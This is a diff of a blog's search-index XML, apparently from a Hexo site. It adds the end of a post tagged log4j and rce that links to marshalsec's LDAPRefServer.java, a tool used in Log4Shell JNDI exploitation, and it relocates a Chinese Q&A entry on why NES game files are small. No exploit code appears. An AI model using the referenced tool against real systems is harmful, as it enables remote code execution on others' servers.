+<p><a href="https://github.com/mbechler/marshalsec/blob/master/src/main/java/marshalsec/jndi/LDAPRefServer.java">marshalsec/LDAPRefServer.java at master · mbechler/marshalsec (github.com)</a></p>
+]]></content>
+      <tags>
+        <tag>log4j</tag>
+        <tag>rce</tag>
       </tags>
   </entry>
   <entry>
@@ -1417,22 +1417,6 @@
       </tags>
   </entry>
   <entry>
-    <title>红白机游戏文件如何做到这么小</title>
-    <url>/why-NES-file-so-small.html</url>
-    <content><![CDATA[<p>汇编语言编写</p>
-<p>美术和音乐资源都实现了复用，多次压缩，实时渲染</p>
-<p>保存了音频文件相关的数据序列，随着游戏的运行，实时演奏的。</p>
-<p>玩家在玩游戏的时候，卷轴经过的地方在<a href="https://www.zhihu.com/search?q=%E6%98%BE%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:185449257%7D">显存</a>中被绘制，经过以后，前边的地方在显存中就释放掉了</p>
-<p>超级马里奥中的砖块，云朵，小怪都只是占用了一份内存。更离谱的是，只保存了物体的一半，比如蘑菇，只保存蘑菇的一半数据，渲染的时候做了镜像处理。</p>
-]]></content>
-      <categories>
-        <category>问答</category>
-      </categories>
-      <tags>
-        <tag>红白机</tag>
-      </tags>
-  </entry>
-  <entry>
     <title>Unix socket 与 TCP/IP socket 的区别</title>
     <url>/unix-socket-and-tcp-ip-socket.html</url>
     <content><![CDATA[<h2 id="Unix-socket"><a href="#Unix-socket" class="headerlink" title="Unix socket"></a>Unix socket</h2><p>又叫 IPC（inter-process communication 进程间通信） socket，用于实现同一主机上的进程间通信。通过监听 path（Unix 文件系统路径） 而不是 port。直接将应用层数据从一个进程拷贝到另一个进程，不需要经过网络层（检查、路由等），因此比 IP socket 效率更高。</p>
@@ -1450,6 +1434,22 @@
       <tags>
         <tag>socket</tag>
         <tag>tcp</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>红白机游戏文件如何做到这么小</title>
+    <url>/why-NES-file-so-small.html</url>
+    <content><![CDATA[<p>汇编语言编写</p>
+<p>美术和音乐资源都实现了复用，多次压缩，实时渲染</p>
+<p>保存了音频文件相关的数据序列，随着游戏的运行，实时演奏的。</p>
+<p>玩家在玩游戏的时候，卷轴经过的地方在<a href="https://www.zhihu.com/search?q=%E6%98%BE%E5%AD%98&search_source=Entity&hybrid_search_source=Entity&hybrid_search_extra=%7B%22sourceType%22:%22answer%22,%22sourceId%22:185449257%7D">显存</a>中被绘制，经过以后，前边的地方在显存中就释放掉了</p>
+<p>超级马里奥中的砖块，云朵，小怪都只是占用了一份内存。更离谱的是，只保存了物体的一半，比如蘑菇，只保存蘑菇的一半数据，渲染的时候做了镜像处理。</p>
+]]></content>
+      <categories>
+        <category>问答</category>
+      </categories>
+      <tags>
+        <tag>红白机</tag>
       </tags>
   </entry>
   <entry>
